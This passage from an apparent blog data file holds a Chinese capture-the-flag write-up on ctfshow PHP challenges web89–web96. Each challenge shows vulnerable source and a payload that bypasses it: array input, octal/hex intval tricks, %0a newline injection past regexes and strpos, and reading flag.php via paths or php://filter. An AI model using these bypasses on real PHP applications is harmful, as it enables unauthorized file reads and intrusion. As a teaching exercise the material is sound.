方法同上","categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"http://example.com/categories/ctfshow/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"php特性","slug":"php特性","date":"2021-11-11T02:49:11.000Z","updated":"2021-12-22T02:44:30.520Z","comments":true,"path":"2021/11/11/php特性/","link":"","permalink":"http://example.com/2021/11/11/php%E7%89%B9%E6%80%A7/","excerpt":"","text":"web89源码： 1234567891011121314151617181920212223242526&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 15:38:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if(preg_match(&quot;/[0-9]/&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num))&#123; echo $flag; &#125;&#125; 查看一下 intval 函数说明,就可以知道使用数组来绕过 进一步查看，可以知道 preg_match 是无法处理数组的 利用 preg_match() 函数无法处理数组的漏洞 payload: 12?num[]=9?num[]= web90源码： 123456789101112131415161718192021222324252627&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 16:06:11# @email: h1xa@ctfer.com# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(iseet($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num===&quot;4476&quot;)&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0) &#125;&#125; 这个题也是参考 intval 函数的，只需要了解该函数的第二个参数就可以知道 payload: 123?num=0x117c?num=010574?num=4476a //a可以为任意字母 web91源码： 1234567891011121314151617181920212223242526272829&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 16:16:09# @link: https://ctfer.com*/show_source(__FILE__);include(&#x27;flag.php&#x27;);$a=$_GET[&#x27;cmd&#x27;];if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123; if(preg_match(&#x27;/^php$i&#x27;, $a))&#123; echo &#x27;hacker&#x27;; &#125; else&#123; echo $flag; &#125;&#125;else&#123; echo &#x27;nonononono&#x27;;&#125;Notice: Undefined index: cmd in /var/www/html/index.php on line 15nonononono 分析： ​ 1.正则表达式：/^php$/im: ​ ^:匹配输入字符串的开始位置 ​ $:匹配输入字符串的结尾位置 ​ i:不区分大小写 ​ m:多行匹配，使边界字符串为 php 才能为针进入此if中 ​ 2.正则表示 /^php$/i: 与上一个正则相比少了多行匹配。所以突入点就是这个 m ​ 3.第二个 if 语句不能满足才能得到 flag 的意思就是 第二个 if 他不能匹配到这个字符串 php ​ 4.第一个 if 语句多行匹配到字符串 php ​ 5. 因此得让第一个多行匹配能匹配到字符串 php 而第二个不能匹配到字符串 php 就得让第一行为 php 第二行或第三行不为 php,所以这题需要使用到 %0a 实验： ​ 1.直接输入 php 效果 1?cmd=php ​ 2.使用 回车(%0a) 后 1?cmd=php%0a123 web92源码： 12345678910111213141516171819202122232425&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 16:29:30# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)==4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; 分析: ​ 1. intval() 获取变量的整数值， intval (mixed ) ​ 2. 使用指定进制 base 转换(默认十进制)base是0，检测 var 的格式来决定使用的进制； if(intval($num,0)==4476){echo $flag;} 此处 == 为若比较，只比较数值，不比较类型，那么将4476转换为八进制(010574)或十六进制(0x117c)，就能使比较成立并得到flag 12?num=0x117c?num=010574 web93源码： 12345678910111213141516171819202122232425262728&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 16:32:58# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)==4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; 分析： ​ 1.比较上一题，多了正则匹配了 字母，那么六进制 0x 将失效 ​ 2.八进制(010574) 1?num=010574 web94源码： 1234567891011121314151617181920212223242526272829&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 16:46:19# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num===&quot;4476&quot;)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;&#125; 分析： ​ 这题中出现了新的函数 strpos ,百度查意思 12strpos() 函数查找字符串在另一字符串中第一次出现的位置返回值：返回字符串在另一个字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。 字符串位置从0开始，不是从 1 开始 对于strpos()函数，我们可以利用换行进行绕过(%0a) 1?num=%0a010574 也可以使用小数点绕过 1?num=4476.0 因为inval()函数只读取整数部分 web95源码： 1234567891011121314151617181920212223242526272829&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 16:53:59# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123; die(&quot;no no no!!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!!!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;&#125; 分析： ​ 这题相较上一题多了小数点的过滤 ​ strops()可以用 %0a(换行),%20(空格),%2b(+),空格 绕过 ​ 因为过滤了字母，所以此题只能使用八进制形式。 ​ %0a010574 %20010574( 010574) %2b010574(+010574) payload: ​ web96源码： 123456789101112131415161718192021222324&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 19:21:24# @link: https://ctfer.com*/highlight_file(__FILE__);if(isset($_GET[&#x27;u&#x27;]))&#123; if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123; die(&quot;no no no&quot;); &#125;else&#123; highlight_file($_GET[&#x27;u&#x27;]); &#125;&#125; 分析： 1. if GET 到的字符串为 flag.php 则会停止 2. 而整个代码，最后 highlight_file() 在 else 上，那么 GET 到的 u 必须为 FALSE 才能执行 else ，但是 U 不能等于 flag.php；不过 highlight_file() 使用路径，那么就有：./flag.php 表示当前目录下的文件，或者绝对路径：/var/www/html/flag.php,或者php伪协议 ：php://filter/resource=flag.php payload： 123?u=./flag.php?u=/var/www/html/flag.php?u=php://filter/resource=flag.php web97","categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"http://example.com/categories/ctfshow/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]}],"categories":[{"name":"靶机渗透","slug":"靶机渗透","permalink":"http://example.com/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"},{"name":"软件安装","slug":"软件安装","permalink":"http://example.com/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/"},{"name":"FPGA","slug":"FPGA","permalink":"http://example.com/categories/FPGA/"},{"name":"ctfshow","slug":"ctfshow","permalink":"http://example.com/categories/ctfshow/"}],"tags":[{"name":"实战","slug":"实战","permalink":"http://example.com/tags/%E5%AE%9E%E6%88%98/"},{"name":"DVWA","slug":"DVWA","permalink":"http://example.com/tags/DVWA/"},{"name":"软件安装","slug":"软件安装","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/"},{"name":"FPGA","slug":"FPGA","permalink":"http://example.com/tags/FPGA/"},{"name":"靶机","slug":"靶机","permalink":"http://example.com/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]}